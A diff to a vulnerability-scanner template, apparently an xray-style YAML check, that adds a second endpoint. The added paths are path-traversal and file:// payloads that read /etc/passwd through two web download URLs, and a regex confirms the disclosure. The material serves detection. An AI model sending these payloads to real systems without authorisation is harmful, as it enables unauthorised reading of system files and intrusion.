@@ -15,8 +15,15 @@ info:
 
 rules:
   r0:
+    brute:
+      mode: clusterbomb
+      commit: winner
+      continue: false
+      p:
+        - /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd
+        - /evo-apigw/evo-cirs/file/download?filePath=file:///etc/passwd
     request:
       method: GET
-      path: /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd
+      path: "{{p}}"
     expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: r0()
